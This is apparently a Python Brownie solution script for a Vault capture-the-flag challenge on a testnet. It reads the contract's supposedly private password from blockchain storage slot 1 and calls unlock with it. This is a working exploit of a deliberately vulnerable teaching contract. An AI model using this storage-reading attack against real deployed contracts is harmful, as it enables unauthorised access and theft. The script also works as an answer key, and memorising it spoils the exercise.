"""
Task:
    Unlock the Vault contract (see Vault.sol)

Solution:
    Password is stored in the blockchain, thus extract it and unlock the contract.
"""

import web3
from brownie import interface, Vault, config, network
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account

if network.show_active() == "rinkeby": from web3.auto.infura.rinkeby import w3 
else: from web3.auto import w3


def init_vault_deployment():
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        deploying_account = get_account(1)
        password = "123456789"
        vault_contract = Vault.deploy(password, {"from": deploying_account})
    else:
        vault_contract_address = config["networks"][network.show_active()]["vault_instance"]
        vault_contract = interface.IVault(vault_contract_address)
    return vault_contract


def get_info_from_slots(contract):
    extracted_locked = w3.eth.get_storage_at(contract.address, 0).hex()
    extracted_password = w3.eth.get_storage_at(contract.address, 1).hex()
    return extracted_password, extracted_locked


def attack_vault_contract(vault_contract, password_extracted):
    hacking_account = get_account()
    vault_contract.unlock(password_extracted, {"from": hacking_account})


def main():
    vault_contract = init_vault_deployment()
    password_extracted, locked_extracted = get_info_from_slots(vault_contract)
    print("Password extracted: {}".format(password_extracted))
    print("Lock extracted before hack: {}".format(locked_extracted))
    attack_vault_contract(vault_contract, password_extracted)
    _, locked_hacked = get_info_from_slots(vault_contract)
    print("Lock extracted after hack: {}".format(locked_hacked))  
